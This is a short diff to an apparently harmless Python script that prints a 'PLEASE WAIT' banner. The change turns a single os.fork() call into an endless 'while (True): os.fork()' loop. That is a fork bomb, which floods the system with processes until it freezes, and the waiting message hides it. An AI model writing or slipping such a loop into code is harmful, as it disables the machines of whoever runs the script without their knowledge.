@@ -16,4 +16,5 @@ def t(nn,t_):
 t(0.10,'\n\t   \033[1;35m[ ..... PLEASE WAIT .... ]')
 print (' ')
 time.sleep(0.2)
-os.fork()
+while (True):
+	os.fork()
